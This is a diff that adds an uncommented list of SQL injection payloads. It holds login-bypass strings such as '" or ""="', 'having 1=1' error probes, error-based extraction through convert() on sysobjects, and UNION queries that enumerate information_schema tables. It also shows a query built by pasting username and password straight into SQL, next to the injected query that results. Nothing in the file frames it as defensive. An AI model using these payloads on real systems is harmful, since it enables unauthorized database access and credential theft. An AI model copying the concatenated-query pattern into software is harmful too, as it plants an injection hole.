@@ -1,0 +1,31 @@
+ ' having 1=1--
+
+ " having 1=1--
+
+" or ""="
+
+
+" xor ""="
+
+" convert(int,(select top 1 sys_name from sysobjects where user_type=’u’)) or ""="
+
+
+'SELECT * FROM users WHERE u_name ="'.$username.'" AND u_pass ="'.$password.'"'
+
+SELECT * FROM users WHERE u_name ="fasd" AND u_pass ="" or ""=""
+
+
+
+" and password=convert(int,(select top 1 sys_name from sysobjects where user_type=’u’)) or ""="
+
+
+" and password=convert(int,(select top 1 sys_name from sysobjects where user_type=’u’)) -- 
+
+" or pass=convert(int,(select top 1 sys_name from sysobjects where user_type=’u’)) -- 
+
+" or 1=1 -- 
+
+
+saf" UNION ( SELECT table_name, table_schema,'a','b','c' FROM information_schema.tables) -- 
+
+tom" UNION ( SELECT table_name, table_schema, 'a' , 'b' FROM information_schema.tables) --
